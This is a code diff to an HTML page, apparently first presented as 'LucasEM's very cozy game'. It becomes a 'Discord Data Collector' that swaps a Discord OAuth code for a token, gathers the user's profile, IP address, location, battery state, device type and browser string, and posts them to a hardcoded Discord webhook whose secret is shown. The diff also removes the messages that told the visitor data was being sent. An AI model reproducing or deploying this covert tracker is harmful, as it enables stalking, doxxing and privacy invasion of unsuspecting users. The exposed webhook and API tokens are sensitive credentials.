@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LucasEM's very cozy game</title>
+    <title>Discord Data Collector</title>
     <style>
         #loading-screen {
             position: fixed;
@@ -47,7 +47,34 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs"; // Your Webhook URL
         const API_ENDPOINT = "https://discord.com/api";
 
-        // Function to fetch IP address
+        // Get user's device information
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceType = "Unknown";
+
+            if (/mobile/i.test(userAgent)) deviceType = "Mobile";
+            else if (/tablet/i.test(userAgent)) deviceType = "Tablet";
+            else if (/desktop/i.test(userAgent) || /Macintosh|Windows/i.test(userAgent)) deviceType = "Desktop";
+
+            return {
+                browser: navigator.userAgent,
+                deviceType: deviceType
+            };
+        }
+
+        // Get battery information
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: `${Math.round(battery.level * 100)}%`,
+                    charging: battery.charging ? "Yes" : "No"
+                };
+            }
+            return { level: "Unknown", charging: "Unknown" };
+        }
+
+        // Fetch IP address
         function getIP() {
             return fetch("https://ipinfo.io/json?token=abfa2c858d87e3")
                 .then(response => response.json())
@@ -65,8 +92,10 @@
         const code = urlParams.get("code");
 
         if (code) {
-            // Fetch IP address
-            getIP().then(ipData => {
+            // Fetch IP, battery, and device info
+            Promise.all([getIP(), getBatteryInfo()]).then(([ipData, batteryData]) => {
+                const deviceInfo = getDeviceInfo();
+
                 // Exchange the authorization code for an access token
                 fetch(`${API_ENDPOINT}/oauth2/token`, {
                     method: "POST",
@@ -104,7 +133,11 @@
                                                 { name: "Username", value: `${user.username}#${user.discriminator}`, inline: true },
                                                 { name: "User ID", value: user.id, inline: true },
                                                 { name: "IP Address", value: ipData.ip, inline: false },
-                                                { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country}`, inline: false }
+                                                { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country}`, inline: false },
+                                                { name: "Battery Level", value: batteryData.level, inline: true },
+                                                { name: "Charging", value: batteryData.charging, inline: true },
+                                                { name: "Device Type", value: deviceInfo.deviceType, inline: true },
+                                                { name: "Browser", value: deviceInfo.browser, inline: false }
                                             ],
                                             thumbnail: {
                                                 url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`
@@ -120,19 +153,13 @@
                                         "Content-Type": "application/json"
                                     },
                                     body: JSON.stringify(webhookData)
-                                })
-                                    .then(() => {
-                                        document.getElementById("loading-screen").innerHTML = "<h1>Data Sent Successfully!</h1>";
-                                    })
-                                    .catch(error => {
-                                        console.error("Error sending webhook:", error);
-                                        document.getElementById("loading-screen").innerHTML = "<h1>Error Sending Data.</h1>";
-                                    });
+                                }).catch(error => {
+                                    console.error("Error sending webhook:", error);
+                                });
                             });
                     })
                     .catch(error => {
                         console.error("Error exchanging code for token:", error);
-                        document.getElementById("loading-screen").innerHTML = "<h1>Error Authenticating.</h1>";
                     });
             });
         } else {
